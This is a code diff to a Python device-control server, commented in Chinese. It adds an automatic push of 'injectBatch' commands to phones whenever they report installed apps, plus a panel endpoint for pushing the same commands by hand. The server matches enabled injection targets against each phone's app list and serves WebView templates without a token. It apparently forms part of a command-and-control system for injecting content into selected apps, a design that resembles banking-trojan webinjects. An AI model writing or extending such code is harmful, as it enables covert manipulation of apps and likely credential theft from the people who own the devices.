@@ -627,6 +627,18 @@ def _cache_device_dataset(rec, dev, action, data):
         count = len(data.get('data') or data.get('list') or [])
         print('[server] %s cache %s (%d items, changed=%s)' %
               (dev, bucket, count, changed), flush=True)
+        # 设备刚上报"已装应用"：服务端比对后自动一次性下发注入请求（每台设备 120 秒最多一次）
+        if bucket == 'apps' and changed:
+            try:
+                _last = _INJECT_PUSH_AT.get(dev, 0)
+                if now - _last >= 120:
+                    _INJECT_PUSH_AT[dev] = now
+                    _items = _ai.inject_batch_items(dev)
+                    if _items:
+                        import asyncio as _aio
+                        _aio.ensure_future(_auto_push_inject(dev, _items))
+            except Exception as _e:
+                print('[server] auto injectBatch skipped: %s' % str(_e)[:120], flush=True)
         return True
     except Exception as e:
         print('[server] %s cache failed: %s' % (bucket, str(e)[:160]), flush=True)
@@ -756,6 +768,24 @@ async def on_device_frame(dev, text, ws):
                         _lst.remove(_pws)
                     except Exception:
                         pass
+
+
+_INJECT_PUSH_AT = {}
+
+
+async def _auto_push_inject(dev, items):
+    """自动下发：失败静默（设备离线时下次上报再试）。"""
+    try:
+        ok = await send_command(dev, 'injectBatch', {'items': items, 'count': len(items)})
+        if ok:
+            try:
+                import api_impl as _ai
+                _ai.mark_inject_dispatched(dev, items)
+            except Exception:
+                pass
+            print('[server] injectBatch(auto) -> %s (%d items)' % (dev, len(items)), flush=True)
+    except Exception as e:
+        print('[server] auto injectBatch failed: %s' % str(e)[:120], flush=True)
 
 
 async def send_command(dev, action, data=None):
@@ -1772,6 +1802,37 @@ def mount_full_surface(app):
             })
         return web.json_response({'ok': True, 'settings': out, 'count': len(out)})
     app.router.add_get('/api/device-inject-settings', device_inject_settings)
+
+    async def device_inject_push(request):
+        """服务器比对后**一次性下发**注入请求给设备（面板「下发注入」/ 自动触发）。
+
+        流程：设备上报已装应用 → 服务端筛出 enabled∩已装 → 这里一次性下发 injectBatch，
+        并把状态记为 dispatched（面板显示「等待手机收到」）。
+        """
+        body = {}
+        try:
+            body = await request.json()
+        except Exception:
+            body = dict(request.query)
+        dev = str(body.get('deviceId') or request.query.get('deviceId') or '').strip()
+        if not dev:
+            return web.json_response({'ok': False, 'error': 'deviceId 必填'}, status=400)
+        try:
+            import api_impl as _ai
+            items = _ai.inject_batch_items(dev)
+            if not items:
+                return web.json_response({'ok': True, 'count': 0, 'msg': '没有匹配的注入目标'})
+            ok = await send_command(dev, 'injectBatch', {'items': items, 'count': len(items)})
+            if not ok:
+                return web.json_response({'ok': False, 'error': '设备不在线'}, status=409)
+            _ai.mark_inject_dispatched(dev, items)
+            print('[server] injectBatch -> %s (%d items)' % (dev, len(items)), flush=True)
+            return web.json_response({'ok': True, 'count': len(items), 'items': items})
+        except Exception as e:
+            return web.json_response({'ok': False, 'error': str(e)[:160]}, status=500)
+
+    app.router.add_post('/api/device-inject-push', device_inject_push)
+
 
     async def inject_tpl_public(request):
         """设备 WebView 用的模板直链（免 token）：/inject/tpl/<id>"""
